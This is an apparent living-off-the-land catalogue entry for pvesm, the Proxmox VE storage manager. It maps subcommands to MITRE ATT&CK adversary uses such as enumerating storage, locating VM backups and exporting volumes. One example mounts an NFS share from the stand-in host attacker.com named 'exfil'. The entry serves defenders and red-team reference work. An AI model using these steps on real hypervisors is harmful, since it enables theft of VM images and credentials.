---
Name: pvesm
Description: pvesm (Proxmox VE Storage Manager) manages storage resources in Proxmox VE including local, NFS, iSCSI, Ceph, and ZFS storage. Adversaries can use pvesm to enumerate storage infrastructure, locate VM disk images and backups, and identify sensitive data locations for exfiltration.
Author: 'ZephrFish'
Created: 2025-12-06
Commands:
  - Command: pvesm status
    Description: Display status of all storage resources including type, content types, and available space.
    Usecase: Enumerate all storage backends to understand where VM images and backups are stored.
    Category: discovery
    Privileges: Administrator
    MitreID: T1082
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pvesm status
      - pvesm status --output-format=json-pretty

  - Command: pvesm list {storage}
    Description: List contents of a specific storage showing VM images, templates, backups, and ISOs.
    Usecase: Discover backup files and VM disk images for potential exfiltration or tampering.
    Category: discovery
    Privileges: Administrator
    MitreID: T1082
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pvesm list local
      - pvesm list local-lvm
      - pvesm list local --content backup

  - Command: pvesm path {storage}:{content}/{volname}
    Description: Get the filesystem path for a storage volume.
    Usecase: Resolve storage paths for direct disk access and manipulation.
    Category: discovery
    Privileges: Administrator
    MitreID: T1082
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pvesm path local:backup/vzdump-qemu-100-2024_01_01-00_00_00.vma.zst

  - Command: pvesm export {volume} {format} {filename}
    Description: Export a storage volume to a file.
    Usecase: Exfiltrate VM disk images or backups for offline analysis or credential extraction.
    Category: exfiltration
    Privileges: Administrator
    MitreID: T1567
    OperatingSystem: Proxmox VE

  - Command: pvesm scan nfs {server}
    Description: Scan an NFS server for available exports.
    Usecase: Discover accessible NFS shares for lateral movement or additional storage targets.
    Category: discovery
    Privileges: Administrator
    MitreID: T1135
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pvesm scan nfs 192.168.1.100
      - pvesm nfsscan 192.168.1.100

  - Command: pvesm scan iscsi {portal}
    Description: Scan an iSCSI portal for available targets.
    Usecase: Discover accessible iSCSI targets for storage enumeration or lateral movement.
    Category: discovery
    Privileges: Administrator
    MitreID: T1082
    OperatingSystem: Proxmox VE

  - Command: pvesm add {type} {storage} --path {path}
    Description: Add a new storage resource to Proxmox.
    Usecase: Add attacker-controlled storage for staging or exfiltration.
    Category: persistence
    Privileges: Administrator
    MitreID: T1074
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - pvesm add nfs exfil --server attacker.com --export /data --path /mnt/exfil

Full_Path:
  - Path: /usr/sbin/pvesm

Resources:
  - Link: https://pve.proxmox.com/pve-docs/pvesm.1.html
  - Link: https://pve.proxmox.com/wiki/Storage

Acknowledgement:
  - Person: ZephrFish
    Handle: '@ZephrFish'
---
